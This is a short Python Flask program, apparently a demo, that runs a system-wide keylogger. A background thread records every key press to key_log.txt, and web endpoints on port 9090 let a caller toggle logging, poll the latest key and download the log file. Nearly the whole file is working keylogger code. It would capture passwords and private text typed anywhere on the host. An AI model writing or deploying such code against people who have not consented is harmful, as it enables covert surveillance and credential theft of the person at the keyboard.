from flask import Flask, render_template, request, send_file, jsonify
import keyboard
import os
import threading

app = Flask(__name__)

log = 'key_log.txt'
key_pressed = None  
logging_enabled = False  

def keystroke(event):
    global key_pressed
    if logging_enabled:
        key_pressed = event.name
        with open(log, 'a') as f:
            f.write('{}\n'.format(event.name))

def start_keylogging():
    keyboard.on_press(keystroke)
    keyboard.wait()  

keylogging_thread = threading.Thread(target=start_keylogging, daemon=True)
keylogging_thread.start()

@app.route('/')
def index():
    
    with open(log, 'w') as f:
        pass  
    return render_template('index.html')

@app.route('/download', methods=['POST'])
def download():
    if os.path.exists(log):
        return send_file(log, as_attachment=True)
    return "File not found", 404

@app.route('/check-keypress')
def check_keypress():
    global key_pressed
    result = {'keyPressed': key_pressed}
    key_pressed = None  
    return jsonify(result)

@app.route('/enable-logging', methods=['POST'])
def enable_logging():
    global logging_enabled
    logging_enabled = True
    return "Logging enabled", 200

@app.route('/disable-logging', methods=['POST'])
def disable_logging():
    global logging_enabled
    logging_enabled = False
    return "Logging disabled", 200

if __name__ == '__main__':
    app.run(port=9090)
